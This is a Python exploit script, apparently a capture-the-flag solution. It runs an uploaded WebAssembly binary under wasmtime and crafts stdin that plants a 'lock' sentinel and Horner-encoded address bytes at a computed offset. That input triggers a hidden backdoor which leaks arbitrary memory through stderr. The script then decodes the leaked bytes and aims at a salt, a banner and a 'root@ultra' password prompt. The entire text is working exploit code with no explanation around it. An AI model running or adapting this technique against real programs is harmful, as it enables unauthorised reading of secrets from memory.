import wasmtime, sys, re

CONST = 805306320          # acc = Horner(24 bytes) - 805306320  == leak pointer
LOCK  = b"lock"            # 0x6B636F6C sentinel
PANIC_LEN = 54             # message "index out of bounds: the len is 32 but the index is 32"
BUFSTART = 1068151         # heap addr of the (long) code string, 1st copy  (deterministic)
BASE = PANIC_LEN*19418 + 20090   # = 1068662, address backdoor reads
OFF  = BASE - BUFSTART      # = 511, where to plant lock+payload inside the code

def horner_bytes(target):
    """choose 24 bytes b0..b23 so that (b0<<23+...+b23) - CONST == target (mod 2^32)"""
    V=(target+CONST)&0xffffffff; b=[0]*24; rem=V
    for i in range(24):
        w=1<<(23-i); t=min(255,rem//w); b[i]=t; rem-=t*w
    acc=0
    for x in b: acc=((acc<<1)+x)&0xffffffff
    assert (acc-CONST)&0xffffffff==target, "encode failed"
    return bytes(b)

def fire(target, path="/mnt/user-data/uploads/world.wasm"):
    code=bytearray(b"C"*2000)
    code[OFF:OFF+4]=LOCK
    code[OFF+4:OFF+28]=horner_bytes(target)
    stdin=b"1234\n2\n"+bytes(code)+b"\n"
    e=wasmtime.Engine(); mod=wasmtime.Module.from_file(e,path)
    l=wasmtime.Linker(e); l.define_wasi(); st=wasmtime.Store(e); w=wasmtime.WasiConfig()
    open("in.txt","wb").write(stdin)
    w.stdin_file="in.txt"; w.stdout_file="out.txt"; w.stderr_file="err.txt"
    w.preopen_dir("sandbox","/"); st.set_wasi(w)
    inst=l.instantiate(st,mod)
    try: inst.exports(st)["_start"](st)
    except: pass
    return open("err.txt","rb").read().decode(errors="replace")

def decode_leak(err):
    """backdoor prints '<i>: <dword>' lines; byte[target+i] = dword & 0xff"""
    out=bytearray()
    for line in err.splitlines():
        mobj=re.match(r'^[0-9a-f]+:\s*([0-9a-f]{8})$', line.strip())
        if mobj:
            dword=int(mobj.group(1),16)
            out.append(dword & 0xff)
    return bytes(out)

if __name__=="__main__":
    print(f"plant 'lock'+payload at code offset {OFF}; panic len {PANIC_LEN} -> backdoor reads addr {BASE}\n")
    for name,target in [("salt (0xffb41)",1047361),
                        ("banner str",1050692),
                        ("password prompt 'root@ultra'",1050940)]:
        err=fire(target)
        leak=decode_leak(err)
        print(f"[read @ {target:#x}] {name}")
        print(f"   leaked bytes: {leak!r}")
        print(f"   as ascii    : {leak.decode(errors='replace')}\n")
